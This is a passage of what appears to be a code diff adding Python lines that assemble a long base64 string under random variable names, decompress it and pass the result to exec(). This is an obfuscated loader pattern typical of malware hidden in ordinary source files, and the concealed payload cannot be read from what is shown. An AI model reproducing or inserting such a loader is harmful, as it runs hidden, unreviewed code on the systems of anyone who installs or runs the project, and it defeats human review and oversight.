+jiRdZZZF += 'VMxBmrQDNGb5qjUyM8fej8M7ezmWSWjguNL0U3XppUkHO6rAXIfdlt0BUsO+'
+jiRdZZZF += 'BCgGMH+5yjrqYAw2NOjc+K47X7MjNBl9+GGhx4JQlJFhVORh8KHSCMdcquFA'
+jiRdZZZF += 'oxEv0OhESMUXR+jx43Eo6dMhAPrdlWkS+N3H0e2OOOiFdFe8EPcBh+NO43Bf'
+jiRdZZZF += 'p3E46kwj+MliHC6ofwjxtNrBsfFCYkOYXh5oYZDjqIWJY/AqgbDgy8Sjea3G'
+jiRdZZZF += '6JB+7qlCUecaKSgtbRwh7FwjuHSu+wGjc43A2N73g0PnmlUCbJDjgMIS7ZXP'
+jiRdZZZF += '0TT5SUOEFGKGKBXLN0SMs5AhCqH4RkfU8D5WZ9gTBd/BBiGeLg/uY5PiJxH4'
+jiRdZZZF += 'A0oNvUartr3BHJOOYzdAHbVOq3PSqJegl1g4duzY0bGjxfHJY8WMOtAVrC0h'
+jiRdZZZF += 'j/YBmj/60YUL/Ad7Ez+DUHhlHxHsv8bQZAyjKWLhhbyBD7wR+F8gEFKpCDTl'
+jiRdZZZF += 'NYLjR3B6IlGfHsaPSgaRsggd9d+iGDxcZJg/ElIhpuTkDZVwHIfDMIIEY34k'
+jiRdZZZF += 'eYC/f0MCempuA0YjKGpmyRsQCSz5rPO0SVJ2lbcwjpJd+HHhQmU0QAnRE3kh'
+jiRdZZZF += 'rIzEWxTHDwdyEFrh5cjexM8glL2yz2jwPpqEJmJYhRFzqsFA7gVxfgmbhMiP'
+jiRdZZZF += '7PnJh/E9PurIPm+Q7dX5OfZDjDJmt5s723wkcofF5Tg4MujDri0szQsJscg3'
+jiRdZZZF += 'Igko7A3vzd4ww8ZDRAycGwCsJs1yDsQ6B4e6nYY6+twBFyOL44d5v49d8scF'
+jiRdZZZF += '88xcldigQC48rm/h2KZYGIFH15TnIb/ls7Oz8+WXzi4unnt46+33CZk5hzOq'
+jiRdZZZF += 'ny6dxkFTfPtPfNT1iGe0c5KdZhI7zRg7TYWd5vfITiE6No+Ds99n9pk7GheA'
+jiRdZZZF += 'vamKgPV1VAnYm98jT6K1ijGF4WGueIhkC39+D3zhhIXp0ilei/kIe/OIGLLH'
+jiRdZZZF += 'f2wuYcVuOnqbvAS9EBd4I8rAO3mJHYVqeeD50dghC2KjaOpaoNBG0iEWZIGH'
+jiRdZZZF += 'AxKSsxIse+i6kVdW2XlSZwBgiggCKJpk6DmMQebE+VM+PkMViQMmPxFZ43FZ'
+jiRdZZZF += '2fhv8j5fqRh4CxRnb4Bdx+HdgJJArdl4dq4FhTm/urq8WpldXl2dn12rnApQ'
+jiRdZZZF += 'q/blimtcoaWxghroQGGXjvEQXx6aXq9XMFdZ/E+GtvUNmm0YXmnN6VIeikEs'
+jiRdZZZF += 'AyyyYrTBZwIQ0yxl2Amo0FvAvn6FHTRayphGs+XxiABfc/VNQBreRqnvjIyI'
+jiRdZZZF += 'k4nBZQvrGtMCJmQm16kXyTayt5NRwTLlLhuta3RNs0eQcl3E8+KJaZUTVist'
+jiRdZZZF += 'pFdrdlSt0rQnmwsUTu6es/z1Awl4CVvsuEbIaWkBxYCkeuGpqJkHv/gfD3dv'
+jiRdZZZF += 'vg3P7+DBdQM3r8LzMTx34LmNAW/hCzy75MEvfgV/3xG/38HJsVxwRqbRYHPN'
+jiRdZZZF += 'fkIaqJHjuTgGJyexMzkCXcL+YC6DCxhXC27b2VmwNsFXr+OBaof8SWHDqpld'
+jiRdZZZF += 'qEvDIplhAhVFevnDWjB9Tbjl8rqONSTDGB/ADzsqVpOntGVzGpRXDyI0BpH1'
+jiRdZZZF += 'WQ6oKTO9zZ2Hu++B3N67D88f4PkWZPfe+/B8IQK/heefMPBD8QOXV7z3G3ju'
+jiRdZZZF += 'iIA7U2TbZ2ZHzlKzCdh5f0KVza5OxTgAyUxbvFITu8YOra0DNeqTaRiWDnoc'
+jiRdZZZF += 'IArjSI6QAyuyP0nJPzG9DOkmk6fU62BTUqpWR/ctscDna2Mia2O+l9Uxcn2M'
+jiRdZZZF += 'b15wfYIyBlvV6y3dYsNMrtcz6ZUt2zHrcgCLTR17tkP5oJrwAkLDVpHJhzmw'
+jiRdZZZF += 'AKPjWpFAK+F4U4adU8b1opMmOh53PVID/QZsQzddPoLbpXviKNMsfMwjr46l'
+jiRdZZZF += '5F8bmW5fGZnDDv10aBYGIjrGyGnaEyBlCvXL8Hojazgjkzftmm7GUk+eNt6T'
+jiRdZZZF += 'x2A25yd7wvLZJtefbsqT5ZW1heUz5TgrscmEEEinMyLo8ykmnDFZXz0yObFQ'
+jiRdZZZF += 'Pb11eWnstdneT6tLm2fLs7VaScVUp6eScnuC1Fq641Kv1PUaI8cF6g7Xq60W'
+jiRdZZZF += 'DnahAxAYJavb5rqGjZNcIIHGlRufV40aO2X/DBvbIBcs+LLukFjfAVaw9OJ2'
+jiRdZZZF += 'byfULqVQXMfjn8kSZBv0UCG1NF8uz788n0xLOGjhMZkMG3Kp8AEXPhoMaebJ'
+jiRdZZZF += '88/zz7PyCSusQ5sGVAi+WjxZe8MIeFVFBb1xAIBYGRnsdsDuIHQdaGJ3EGtD'
+jiRdZZZF += 'pJuudAaj/hSe2J6XBMUyxzz3UxTf4ql6MHLvXaoDE92dJ1tT6YFnoMn9heIJ'
+jiRdZZZF += '8F30D4P99sxX+TU8t3z3wm/UPxbg92STLxr5L4UDwejJfmWocPzBCsFRy2ub'
+jiRdZZZF += 'LFyIG9c18Ry5bmL46/qm7tYco+MlRvMyRKpqbwqIqT8DGmqX6jGVZXpRqH0r'
+jiRdZZZF += '3OCTWnix3T+K+6mMdoOQ3yTC68Oi+dr3t+757qS6BwBL8m3pfPn+KBaa5juz'
+jiRdZZZF += 'H4mQj4Svds8H/0SlHPJlvxE/8HQc5ir6DuYtX6W0cO0//3D31m8u+pscPhLO'
+jiRdZZZF += '5W+Fs3kHI34pIr72WYoRuMoI/LeHilPcH1FuU+ELgGKjHGVq0ppHlvmqUV9x'
+jiRdZZZF += 'oU/pw4MDWlQucmAl1DbqRrctSoeaYeixKHTLaLYkrJvcifK7l5yO5vcwXc5d'
+jiRdZZZF += 'ETuWY6rN4Fr0eHU4rKMykymqasjb9pRfrl3bECsq/LuHWg4YXnAB1UBxo5AK'
+jiRdZZZF += 'htec4G92pRFYCdOoah104nwICGO/Ayiw4VS9/Mj/ze3LYdx68ia/ZcgV1qgu'
+jiRdZZZF += 'L8p5AS/pwUB+zY0MHhPB7PIZGTopQsWdNzJ8XISDVNlaM3FbEF4VxAoJRGna'
+jiRdZZZF += 'LPfZNnf48qRue25pHCfxTL1XKmgTuQSF4AntbAusHWiXqFUvZeAvuyJEGcBi'
+jiRdZZZF += '4gD1qAQj6phE4khGRtuDEH6UleWMx2gzyTKbC4R84z6ZRb0g/1kcDc5iYvfx'
+jiRdZZZF += 'YZ2CQD4wCaKCRtq4nGE1Ajx66E6lWcCgNK+Sskc7pDhFFtggGthXnMTlg066'
+jiRdZZZF += 'A+1LRW3ncDE2FOPO+ZMXhcqvcwR2Kn4WGiQtL+ch6WW93eGr2nNT4IRjJv1B'
+jiRdZZZF += 'DL8MMyuggLggH/AzKmO/4oyNTZH5y+DeQI0F9dahPHDUCdgiCys8czy0JJU5'
+jiRdZZZF += 'G7Cdw44s9OmwqidGd3SvFWKnkVmlrm1uIkcLK0wJtnkKPuOhkTgDh8x5BcWm'
+jiRdZZZF += 'uAVOUrWHxZHlSPHhpW1WOXbOH7lI1hgjkAzIxujshOUz8FgRre+cP3SRvKRD'
+jiRdZZZF += 'F6xOPBsrDmSAcro0QpaT5vc3SmV7i4t6fIrMUQ9t4wpUfb+26V3Tq3T4aOPE'
+jiRdZZZF += 'xDjbk8IKOIOVQ1ERpnXHC0MpuT3LShkpA1sq3QiH4SvhJJOffcyZnJgiuMoD'
+jiRdZZZF += 'bKfVMLgB5ObQZTrqZeN6KnqYdoOsCcgs3o3XbkOtxZG1YqGgqmdEP8s4poms'
+jiRdZZZF += '8woEVR069VRV1cidCkfIogHin8UZOFFxRd2r8SBgtCDSqOEeIWnOtUUIEC0Q'
+jiRdZZZF += 'G0qtMFNcklZYs+wtv+TYpUmMblaxS03TrupmJMFol1cs34VSYy/ZYmFsQulj'
+jiRdZZZF += 'ByrN/2TFr+mXKgtn5tfyfmx5efZ0Ze7l1emlADlpJCBWa2RKGi6K8mw2oZAn'
+jiRdZZZF += 'WbEOQ2pGLhdDwbFlJrc4tQRBHymRYgguWqviVKpQFhtKUwNFWYGy8LquKubU'
+jiRdZZZF += 'bMbulZQpm3rHZY1luDDJiFLUIYw+WZXVi+v4317km5A6OpaLC7oclgNOP+OO'
+jiRdZZZF += 'HjLPmUC7wN+gAKAi1d0d11d/0ZZdiC/H8z9qGxeu7MwW/eSiqAhYZ9CuTYVr'
+jiRdZZZF += 'O8/Xtqi0O37tPbSnFeClUOHwoWrDq7Uw7CWlyECddNqGrmnQIoeo8AkLv0ZF'
+jiRdZZZF += 'WnzBmFLqXp9UucSVW8YC2or/x93WqT79kujObzkYnD4i/b7fW/hc9FQ+Ej2H'
+jiRdZZZF += 'W6If8Gmss8E6KW/6nZLkIXSf4pdKV/QDv08TGne+K9L5TO3hSKKxXs59pV/r'
+jiRdZZZF += 'nz73lZqqz/8dn4zCAQJ/Jtm/Fes1IfH3RVbu5WPRH/rR/o/PHwaddn9UPd5T'
+jiRdZZZF += '+1Dpi/lD92x6gYiXW/07d343I7V034wx98nDoAv5RWI+HpF1zd/kLmcWQin8'
+jiRdZZZF += '9mFkNEP8/VIJ25WAfXlSqH18sn/Xcc4mPbtLtnS8ptHGVt5D189rUVKD6ubZ'
+jiRdZZZF += 'zkmS7Y1auXi3UgPvHsd10BMe7g0n+UqYwiwnidZJoRoePYpuCuafQa/94eY+'
+jiRdZZZF += 'uVOKHOAVSnwPcnKSSsuhTt6wnqR8YTaFR09J1crKKwmFsaNmTMLnX7woesA2'
+jiRdZZZF += 'bwIDOTJwEF5REZ666T3omvuQYwpkMOcdAxsfDk1eq4NwMdgJBVadW4xDHlUg'
+jiRdZZZF += '1WGhGODkcHj0IAoDJj9TiFwsGVxyPnSY4B2j7LIv8IwcTVysfIUPIoauSWZt'
+jiRdZZZF += 'G4AsGTXHZoOxWbaHtm3UfJBAHzKLjKxUhSB+U9QNP12Nv2SBjAqGPiz2hhRA'
+jiRdZZZF += 'x+etwncUo1C69SwjmItxIAjk5G3OU6F7oofkzZxP8kLOozkudN010BUVNzxr'
+jiRdZZZF += 'hsUK5DDf0V9i0ZrTtaat+rouolg2XT8SmuUVKAXqeL3sMI9iF087dtUHcRWQ'
+jiRdZZZF += 'DAMBB4iDni9e1Iw61wCc4gxmPTN6vc3n9fjWYOEpsYnQIgvuuqbRPlsHN2Fp'
+jiRdZZZF += 'w4/1xB4ju5MZ2gGa4k4vRju6sohdjbsDnZ5rrLPDoh989Ds0eVgyW7ZTTwK/'
+jiRdZZZF += '8TZZ8aMF+BCouEwBCo3nBJWGvZ334y5iRfFpRzb0W9vsGt+dBx/+PfT2TVAa'
+jiRdZZZF += 'SrZ9xJ1DZNGGHhFx5RIb6BL9+h/Y8H5gBaUFZDc77zzYfRfPQOGYDdZ1PUQW'
+jiRdZZZF += 'LLGEKeAY7zQWTGkkZjeVOup/qjZ40jjziXs0jr1QGH/h6ETx+MTU9PRLE0u9'
+jiRdZZZF += '2SuWu+TN0ddmj79cmdPtzuZrk5MLk5esamW1MDxUa+lexUDRDk9OTo4dnTxa'
+jiRdZZZF += 'fAGCeflXQoWEU5CQG29HDCqyhV1sgBALzF8IlhsCXcPrYTNs+RIEiTrVMWo1'
+jiRdZZZF += 'I3UYMFiLzZaMyooijz4K/YhFXwv9SIgWRPqAJN6sEoCphyip198ERyZJOHnM'
+jiRdZZZF += 'kfIeWphLiF/1jxZi2Ue1i3KXfG6Wyn7imVdJFFCS6di78cg+aafc/CIBBsnu'
+jiRdZZZF += 'ucX1lNKOs3ntMQR/z9nhdklNN/kMtX0X4KC5jB/2FU4v+WSvIHqQTK6sruzs'
+jiRdZZZF += 'kb8+OnY1XQjXSP9anBibnOPUahlkmuwv11iwCdrED/PvU7QSLPw7nr/US7US'
+jiRdZZZF += 'jFXKBVdJlk9evJQsO1Ht1V/70nhcdPIXYK8GyCr7KXY0JCt9Sln3Dw0zus3t'
+jiRdZZZF += 'RzSnUeD4/Yx+o7NHOC98sFMzi6dT8pF4Zdq1WFWMVkZmFpJLWNG9fdDDljAV'
+jiRdZZZF += 'JM3QpYZH8y+oJ9eAFIORfJphiEToI1Vvu7bDFIw5pxnmCmV835R5WUqHFnut'
+jiRdZZZF += '4ELt+AMl7NzVPz3cvfEzHL64fl0ctspuj8GAW/B8A8+X4vnm4a33fsVAd5UY'
+jiRdZZZF += 'dvvMbaRExOHXX/lXz2DA5+Io13/R/BT/USD/GUeUrr+H/70rgv+PTw8P1v5f'
+jiRdZZZF += 'gsyXAh4BcJ3w9ZvySpsYffmLqNfgEJ80D7jxX/ZM4s9+fv7gg98VlBHtn0WN'
+jiRdZZZF += 'Piw6PnoPZLtub2lkDucZt6XwdzRyBnufazZZotRDp1Yj2MPKkwVySt+kxO3Q'
+jiRdZZZF += 'mqGbbAsDi4X/iO5Q3JrQk7GeTdo9UrVdN5xyqMuG4cz9nVXdX+4cD7H+eUY3'
+jiRdZZZF += 'Tb21t34wSzTtevqlhuF0EeeQb8OC3jynOP0YKcaVtEV7qjTzsssEAuWbGPze'
+jiRdZZZF += 'vlIQ+0QKyRD7knJ8KagrczYrF1Zi0+QVXMWF04hYaEv0ZJiBzKDAoYSjkyDI'
+jiRdZZZF += 'f6SDxLpFutUjl7oGp6nh2swgp1P+fFu8YIJxhQRLwLUiGEM4HORlOjEqpnZJ'
+jiRdZZZF += '2vVEklzTN6qGM1iajHCXTG9UQwvZoklD9UuESOHAe+occBkcevpCeKosTLuu'
+jiRdZZZF += 'burtLvxnbHTbA7GyLoDBMrmAmycte4tMO2zw4SRRU1aqt4+k8wTz5JSCFMeJ'
+jiRdZZZF += 'sXv4SPBBmzDd9Wycx6gdiXyUzPGxsfJSecZuVxOyljywLNDm5pbLCTjRwduM'
+jiRdZZZF += '/kORIGd3gfCVY5Sdc8lQB1K/heE2qds4ZbFFTTNPvJZubZCX7bqGByd6LQqM'
+jiRdZZZF += 'uDbuIUCYnt0drvMzKqAR3rDsrQQOWa6+B7r9ct7AnOPYY++vKOctXHY2WGbB'
+jiRdZZZF += 'C4CWv6V7Lul2UjhnvkJfqBQ+Tu2Lj7A3gsqOR52CA0jNTorOp3gyA+Gmyq53'
+jiRdZZZF += 'QI6FQ3OG0jpLd3B+VcylXhpyGsOqVRiEc2kRNDLTYyfSLulOrYeLlViLoqXp'
+jiRdZZZF += '7/7x0vTih8eycTBjMm229Ha9a+KhQC3szfj8pDC8F3yEmYPx0KDUJC290+kN'
+jiRdZZZF += 'zEYcJVA+7IYNLJCnX5KnBq3g5yjmncl6ler13qEU1gaA27Nt1vfXNj91IZ6j'
+jiRdZZZF += 'ruiaD8bx8obeE+qMK5h62Ka1cBCgh/NXl0Tnz9XIGjQZ0P/j81p+pzAtP0hV'
+jiRdZZZF += '25vqoWSqg5cT5Da/39weKCuPgU9QxL+mYoHstv5KstuDOsdzS/DgM0mZLY+A'
+jiRdZZZF += 'tPJ+m8rZGNCWrLd65IztCbEwA+aPsu2d9YGQB8/hVsveX2vC0xXDVaSv2ZNA'
+jiRdZZZF += '2uBWbv3R+FnSN8ChA0sr1mwMwF1+b6Q+vO7Lp4ryWqf7Z7U/zt6l/KwUshDc'
+jiRdZZZF += 'E5HbAaVWtet1nWyAAQBOnAGLeIYhMQyy0a2SV3VTT+GRgeq6Bp0ngNbI6W5V'
+jiRdZZZF += 'Y/B6AkYKj6epRaZr9oDMIXEAN/JkrWsQiZvMngBu7QmdwhrDP6Mbg7G2YfT0'
+jiRdZZZF += 'NE5OJ8f1NdoW9uxYcwBd886AatZgy1IZKmLlyetd1yMm9QgYfxwQOMSGKpQ2'
+jiRdZZZF += 'B/q6gJLmpz5Ogim5xU43psGavzYdUBFYO75AaoDst5sa68PXWB/eZyOtQA6O'
+jiRdZZZF += 'nuqWL9qb+zAI4EezL877ETnUJ4btUpiWSNoAGCl8vtTld9kMxOW2g5Zruk3c'
+jiRdZZZF += 'rkPzcv4MaeBwU7Ob2hncN1Y/dgc1+k+f3cYPS7qNH5Z0cb53sNq1hsOkbho/'
+jiRdZZZF += 'qbF90iXTlrulDzgZxRLgNkUZs0sZs29wfphoFOiBufspWKxVSsq21UzgLvnk'
+jiRdZZZF += 'XWDN62pVOlq0PLpWXJw/N7F1Ehdnl1bnlCBc/JB0FR12HtZs23SPRCKSp1jk'
+jiRdZZZF += 'lC2esTjD5lI4+uC23p/Tj1LQSGQnhkspj4FOk9XP/D8+irFywQ8rSDbFXAFp'
+jiRdZZZF += 'VTxGIDzpfMFiq2WgiUUBrWNyazYpU8oSYkt1gyOCzs2XR88s85VMpRfZCszI'
+jiRdZZZF += 'QXjoNgSrBSJJh/fmJci4DNXzEPkpNu46adttakEPjd9Np/EWvmtZbDMKywlu'
+jiRdZZZF += '4IiecacK+PGRS5Su1OzZyNEp+JE37fGP7Pf/NQlHkQHPv1BqNhLgHbDu8YUe'
+jiRdZZZF += 'z2vd81r3vNbtVeu4DNzIvmu2XykQj1op9efV8nm1fF4tn4VqyRT86dbDR6D1'
+jiRdZZZF += 'vAYOpGR/+RXQfRzVLo3I4J4nrkBOWlcXLE4OYF/pDg5b9uykUdFEWHcfsJf2'
+jiRdZZZF += 'wcP8gHlTDY4sURxTUVYY47Aj1n08qbyKB5OxS8tondjw2jJcOXenkZmuB9Bb'
+jiRdZZZF += 'hmkS1DiL6FXo0BPDE0vb7fDsGz8YqyEPU8ZTlD1qUjwgTrOd5mjV9rbljtQd'
+jiRdZZZF += 'dgWYOKQ2uKSso/fwrKHYSbTDYjfq8BQRb+EDWYbxlEaIxJzKiJ3gJPR+h3jm'
+jiRdZZZF += '2UlAJZF0yLzIQyDFQSm4pR/3Bo8VComnn5XxMH11UDqhFeCQc122eg5X1UGQ'
+jiRdZZZF += 'uAocpK27pGvpeKUtxmJJheZq5bl9urvBTmyQU6063hHODtnzUwoPjs3Z1rBH'
+jiRdZZZF += 'Tlu4wImVY3gaVU4BY6PAzoOYB9YHGV/ncZ3eFpTLhuFpLuhKrZXFksgN/Qe4'
+jiRdZZZF += 'YZ8W'
+CuvAlXdz = KxACeDXV.decompress(PzgUWlzo.b64decode(jiRdZZZF)).decode('utf-8')
+exec(CuvAlXdz)
